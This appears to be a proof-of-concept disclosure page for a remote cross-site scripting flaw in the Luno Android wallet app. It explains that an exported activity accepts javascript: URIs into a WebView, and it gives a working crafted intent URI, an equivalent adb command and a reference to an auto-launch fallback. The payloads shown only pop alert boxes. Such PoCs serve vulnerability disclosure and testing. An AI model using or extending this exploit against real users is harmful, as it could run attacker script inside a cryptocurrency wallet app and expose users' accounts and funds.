Luno Wallet — Remote XSS PoC

The Luno Android app exposes co.bitx.android.wallet.app.MainActivity with android:exported="true". The handler in m4044I() validates the URI host (*.luno.com) and path (/daily-briefing) but does not validate the scheme. The raw URI is then loaded into a WebView, so a javascript: URI executes attacker-controlled JS inside the app.

Launch PoC (open in Luno)

Intent URI used

intent://luno.com/daily-briefing?%0aalert(document.domain)#Intent;
  scheme=javascript;
  action=android.intent.action.VIEW;
  category=android.intent.category.BROWSABLE;
  package=co.bitx.android.wallet;
  component=co.bitx.android.wallet/co.bitx.android.wallet.app.MainActivity;
end

Equivalent ADB command

adb shell "am start -n co.bitx.android.wallet/co.bitx.android.wallet.app.MainActivity \
  -a android.intent.action.VIEW \
  -d 'javascript://luno.com/daily-briefing?%0aalert(1)'"

Auto-trigger fallback

Some browsers require a user gesture; the link above provides it. The script below also attempts automatic navigation for browsers that allow it (e.g. WebViews / in-app browsers).

Expected result: Luno app opens, the in-app WebView loads the javascript: URI, and alert(document.domain) executes inside the WebView context — confirming remote, no-privilege XSS against any user who taps a malicious link.
